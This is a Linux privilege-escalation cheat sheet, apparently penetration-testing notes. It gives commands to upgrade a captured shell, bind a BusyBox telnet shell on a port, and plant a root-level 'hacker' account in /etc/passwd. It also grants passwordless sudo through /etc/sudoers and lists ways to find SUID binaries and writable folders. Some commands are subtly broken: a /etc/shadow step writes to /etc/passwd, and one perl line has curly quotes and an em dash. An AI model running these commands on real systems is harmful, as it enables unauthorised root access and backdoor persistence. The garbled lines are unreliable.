## Enumeration


After getting intial shell, create TTY shell:

Python:
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

Bash:
```
echo os.system('/bin/bash')
/bin/sh -i
```

Perl:
```
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
```

Ruby console:
```
 exec "/bin/sh"
```

Lua console:
```
os.execute('/bin/sh')
```

Vi:
```
:!bash
:set shell=/bin/bash:shell
```
BusyBox:
```
/bin/busybox telnetd -|/bin/sh -p9999
```

Set PATH and TERM if they are missing (also to acsses other bins):

```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
export SHELL=bash
``` 

### Manual Enumeration

Check for sudo allowance:

```
sudo su -
sudo -l
```

Is /etc/shadow is world-writable (ls -la /etc/shadow == -rwxrwxrwx) ?

1) Create our password:
```
perl -le ‘print crypt(“Password@973″,”addedsalt”)’
```
2) Append our new user to the /etc/shadow file:

```
echo "hacker:<our_generated_password>:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
```

Can we add user with no password to /etc/sudoers file?

```
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

What process are running under root?

```
ps aux | grep root
```

What SUID / GUID binaris are available?

```
#Find SUID
find / -perm -u=s -type f 2>/dev/null

#Find GUID
find / -perm -g=s -type f 2>/dev/null
```

Abusing sudo-rights using SUID/GUIDS or any 3rd-party utility could be found using https://gtfobins.github.io/

Finding world readable/writable directories:

```
 echo "world-writeable folders"; find / -writable -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -222 -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -o w -type d 2>/dev/null; echo "world-executable folders"; find / -perm -o x -type d 2>/dev/null; echo "world-writeable & executable folders"; find / \( -perm -o w -perm -o x \) -type d 2>/dev/null;
```

Check for Environment variables:
```
cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set
```

Check what exported path are availble:

```
export -p
```
